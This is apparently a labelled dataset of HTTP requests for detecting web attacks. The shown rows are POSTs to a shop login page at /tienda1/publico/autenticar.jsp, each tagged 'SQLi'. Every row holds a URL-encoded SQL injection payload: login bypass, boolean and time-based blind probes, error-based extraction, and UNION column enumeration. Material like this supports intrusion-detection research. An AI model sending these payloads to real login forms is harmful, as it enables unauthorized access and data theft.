,id,method,path,query,label
17,17,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%29%29%29%20AND%202998%3D6614%20AND%20%28%28%288703%3D8703&remember=&modo=entrar,SQLi
18,18,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%29%29%29%20AND%203673%3D3673%20AND%20%28%28%286920%3D6920&remember=&modo=entrar,SQLi
19,19,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%20AND%202646%3D7740&remember=&modo=entrar,SQLi
20,20,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%20AND%203673%3D3673&remember=&modo=entrar,SQLi
21,21,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%29%20AND%207422%3D5880%20AND%20%28%27wWZY%27%3D%27wWZY&remember=&modo=entrar,SQLi
22,22,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%29%20AND%203673%3D3673%20AND%20%28%27Mouv%27%3D%27Mouv&remember=&modo=entrar,SQLi
23,23,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%29%29%20AND%20601%3D870%20AND%20%28%28%27GwsP%27%3D%27GwsP&remember=&modo=entrar,SQLi
24,24,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%29%29%20AND%203673%3D3673%20AND%20%28%28%27gQEQ%27%3D%27gQEQ&remember=&modo=entrar,SQLi
25,25,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%29%29%29%20AND%201575%3D8327%20AND%20%28%28%28%27pIiu%27%3D%27pIiu&remember=&modo=entrar,SQLi
26,26,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%29%29%29%20AND%203673%3D3673%20AND%20%28%28%28%27NHop%27%3D%27NHop&remember=&modo=entrar,SQLi
27,27,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20AND%205464%3D2559%20AND%20%27xKAo%27%3D%27xKAo&remember=&modo=entrar,SQLi
28,28,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20AND%203673%3D3673%20AND%20%27Ufwr%27%3D%27Ufwr&remember=&modo=entrar,SQLi
29,29,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20AND%204204%3D2883%20AND%20%27dUrS%27%3D%27dUrS&remember=&modo=entrar,SQLi
30,30,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20AND%20%28SELECT%20313%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%28CHAR%2858%2C114%2C116%2C109%2C58%29%2C%28SELECT%20%28CASE%20WHEN%20%28313%3D313%29%20THEN%201%20ELSE%200%20END%29%29%2CCHAR%2858%2C101%2C107%2C121%2C58%29%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27oceP%27%3D%27oceP&remember=&modo=entrar,SQLi
31,31,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%3B%20SELECT%20SLEEP%285%29%3B--%20%20AND%20%27MwYM%27%3D%27MwYM&remember=&modo=entrar,SQLi
32,32,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%3B%20SELECT%20BENCHMARK%285000000%2CMD5%28CHAR%28103%2C103%2C118%2C65%29%29%29%3B--%20%20AND%20%27dqiU%27%3D%27dqiU&remember=&modo=entrar,SQLi
33,33,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20AND%20SLEEP%285%29%20AND%20%27KtAM%27%3D%27KtAM&remember=&modo=entrar,SQLi
34,34,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20AND%20SLEEP%285%29%20AND%20%27KtAM%27%3D%27KtAM&remember=&modo=entrar,SQLi
35,35,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%23%20AND%20%27GzxG%27%3D%27GzxG&remember=&modo=entrar,SQLi
36,36,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%23%20AND%20%27YoiO%27%3D%27YoiO&remember=&modo=entrar,SQLi
37,37,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27ykWB%27%3D%27ykWB&remember=&modo=entrar,SQLi
38,38,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27tRBe%27%3D%27tRBe&remember=&modo=entrar,SQLi
39,39,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27VUUr%27%3D%27VUUr&remember=&modo=entrar,SQLi
40,40,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27bLxq%27%3D%27bLxq&remember=&modo=entrar,SQLi
41,41,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27jFwW%27%3D%27jFwW&remember=&modo=entrar,SQLi
42,42,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27Uame%27%3D%27Uame&remember=&modo=entrar,SQLi
43,43,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27TKsN%27%3D%27TKsN&remember=&modo=entrar,SQLi
44,44,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27cyxg%27%3D%27cyxg&remember=&modo=entrar,SQLi
45,45,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20CONCAT%28CHAR%2858%2C114%2C116%2C109%2C58%29%2CIFNULL%28CAST%28CHAR%2881%2C75%2C65%2C117%2C68%2C111%2C78%2C107%2C102%2C77%29%20AS%20CHAR%29%2CCHAR%2832%29%29%2CCHAR%2858%2C101%2C107%2C121%2C58%29%29%23%20AND%20%27UKAu%27%3D%27UKAu&remember=&modo=entrar,SQLi
46,46,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=-4759%27%20UNION%20ALL%20SELECT%20CONCAT%28CHAR%2858%2C114%2C116%2C109%2C58%29%2CIFNULL%28CAST%28CHAR%28122%2C116%2C82%2C104%2C116%2C119%2C65%2C90%2C98%2C65%29%20AS%20CHAR%29%2CCHAR%2832%29%29%2CCHAR%2858%2C101%2C107%2C121%2C58%29%29%23%20AND%20%27RnaT%27%3D%27RnaT&remember=&modo=entrar,SQLi
47,47,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%208618%23%20AND%20%27jGcw%27%3D%27jGcw&remember=&modo=entrar,SQLi
48,48,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%207166%2C%207166%23%20AND%20%27hDjZ%27%3D%27hDjZ&remember=&modo=entrar,SQLi
49,49,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%203660%2C%203660%2C%203660%23%20AND%20%27IkEP%27%3D%27IkEP&remember=&modo=entrar,SQLi
50,50,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%209184%2C%209184%2C%209184%2C%209184%23%20AND%20%27eYLl%27%3D%27eYLl&remember=&modo=entrar,SQLi
51,51,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%205941%2C%205941%2C%205941%2C%205941%2C%205941%23%20AND%20%27SpXv%27%3D%27SpXv&remember=&modo=entrar,SQLi
52,52,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%208880%2C%208880%2C%208880%2C%208880%2C%208880%2C%208880%23%20AND%20%27MfuY%27%3D%27MfuY&remember=&modo=entrar,SQLi
53,53,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20789%2C%20789%2C%20789%2C%20789%2C%20789%2C%20789%2C%20789%23%20AND%20%27meUy%27%3D%27meUy&remember=&modo=entrar,SQLi
54,54,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%207916%2C%207916%2C%207916%2C%207916%2C%207916%2C%207916%2C%207916%2C%207916%23%20AND%20%27IRxK%27%3D%27IRxK&remember=&modo=entrar,SQLi
55,55,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%207921%2C%207921%2C%207921%2C%207921%2C%207921%2C%207921%2C%207921%2C%207921%2C%207921%23%20AND%20%27Wyyt%27%3D%27Wyyt&remember=&modo=entrar,SQLi
56,56,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%203820%2C%203820%2C%203820%2C%203820%2C%203820%2C%203820%2C%203820%2C%203820%2C%203820%2C%203820%23%20AND%20%27SYdH%27%3D%27SYdH&remember=&modo=entrar,SQLi
57,57,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20CONCAT%28CHAR%2858%2C114%2C116%2C109%2C58%29%2CIFNULL%28CAST%28CHAR%2872%2C80%2C100%2C107%2C81%2C87%2C113%2C106%2C114%2C81%29%20AS%20CHAR%29%2CCHAR%2832%29%29%2CCHAR%2858%2C101%2C107%2C121%2C58%29%29%23%20AND%20%27fmtg%27%3D%27fmtg&remember=&modo=entrar,SQLi
58,58,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=-9033%27%20UNION%20ALL%20SELECT%20CONCAT%28CHAR%2858%2C114%2C116%2C109%2C58%29%2CIFNULL%28CAST%28CHAR%28100%2C113%2C118%2C69%2C116%2C80%2C101%2C69%2C122%2C104%29%20AS%20CHAR%29%2CCHAR%2832%29%29%2CCHAR%2858%2C101%2C107%2C121%2C58%29%29%23%20AND%20%27gugY%27%3D%27gugY&remember=&modo=entrar,SQLi
59,59,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27NmtG%27%3D%27NmtG&remember=&modo=entrar,SQLi
60,60,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27jUly%27%3D%27jUly&remember=&modo=entrar,SQLi
61,61,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27kdxr%27%3D%27kdxr&remember=&modo=entrar,SQLi
62,62,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27RKtz%27%3D%27RKtz&remember=&modo=entrar,SQLi
63,63,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27FnXf%27%3D%27FnXf&remember=&modo=entrar,SQLi
64,64,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27PnkB%27%3D%27PnkB&remember=&modo=entrar,SQLi
65,65,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27aJmy%27%3D%27aJmy&remember=&modo=entrar,SQLi
66,66,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27IsIf%27%3D%27IsIf&remember=&modo=entrar,SQLi
67,67,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27SprB%27%3D%27SprB&remember=&modo=entrar,SQLi
68,68,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27mUwT%27%3D%27mUwT&remember=&modo=entrar,SQLi
69,69,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%206326%2C%206326%2C%206326%2C%206326%2C%206326%2C%206326%2C%206326%2C%206326%2C%206326%2C%206326%2C%206326%23%20AND%20%27BuvN%27%3D%27BuvN&remember=&modo=entrar,SQLi
70,70,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%205195%2C%205195%2C%205195%2C%205195%2C%205195%2C%205195%2C%205195%2C%205195%2C%205195%2C%205195%2C%205195%2C%205195%23%20AND%20%27kIhd%27%3D%27kIhd&remember=&modo=entrar,SQLi
71,71,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%203542%2C%203542%2C%203542%2C%203542%2C%203542%2C%203542%2C%203542%2C%203542%2C%203542%2C%203542%2C%203542%2C%203542%2C%203542%23%20AND%20%27GaEQ%27%3D%27GaEQ&remember=&modo=entrar,SQLi
72,72,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%202760%2C%202760%2C%202760%2C%202760%2C%202760%2C%202760%2C%202760%2C%202760%2C%202760%2C%202760%2C%202760%2C%202760%2C%202760%2C%202760%23%20AND%20%27DnxJ%27%3D%27DnxJ&remember=&modo=entrar,SQLi
73,73,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%206607%2C%206607%2C%206607%2C%206607%2C%206607%2C%206607%2C%206607%2C%206607%2C%206607%2C%206607%2C%206607%2C%206607%2C%206607%2C%206607%2C%206607%23%20AND%20%27aLnn%27%3D%27aLnn&remember=&modo=entrar,SQLi
74,74,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%208919%2C%208919%2C%208919%2C%208919%2C%208919%2C%208919%2C%208919%2C%208919%2C%208919%2C%208919%2C%208919%2C%208919%2C%208919%2C%208919%2C%208919%2C%208919%23%20AND%20%27umvJ%27%3D%27umvJ&remember=&modo=entrar,SQLi
75,75,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%204312%2C%204312%2C%204312%2C%204312%2C%204312%2C%204312%2C%204312%2C%204312%2C%204312%2C%204312%2C%204312%2C%204312%2C%204312%2C%204312%2C%204312%2C%204312%2C%204312%23%20AND%20%27cFZI%27%3D%27cFZI&remember=&modo=entrar,SQLi
76,76,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%206618%2C%206618%2C%206618%2C%206618%2C%206618%2C%206618%2C%206618%2C%206618%2C%206618%2C%206618%2C%206618%2C%206618%2C%206618%2C%206618%2C%206618%2C%206618%2C%206618%2C%206618%23%20AND%20%27wqLj%27%3D%27wqLj&remember=&modo=entrar,SQLi
77,77,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%209155%2C%209155%2C%209155%2C%209155%2C%209155%2C%209155%2C%209155%2C%209155%2C%209155%2C%209155%2C%209155%2C%209155%2C%209155%2C%209155%2C%209155%2C%209155%2C%209155%2C%209155%2C%209155%23%20AND%20%27XtUQ%27%3D%27XtUQ&remember=&modo=entrar,SQLi
78,78,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%205767%2C%205767%2C%205767%2C%205767%2C%205767%2C%205767%2C%205767%2C%205767%2C%205767%2C%205767%2C%205767%2C%205767%2C%205767%2C%205767%2C%205767%2C%205767%2C%205767%2C%205767%2C%205767%2C%205767%23%20AND%20%27iMRm%27%3D%27iMRm&remember=&modo=entrar,SQLi
79,79,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27XFgV%27%3D%27XFgV&remember=&modo=entrar,SQLi
80,80,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27Vfvb%27%3D%27Vfvb&remember=&modo=entrar,SQLi
81,81,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27CTmo%27%3D%27CTmo&remember=&modo=entrar,SQLi
82,82,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27bPnE%27%3D%27bPnE&remember=&modo=entrar,SQLi
83,83,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27bXaO%27%3D%27bXaO&remember=&modo=entrar,SQLi
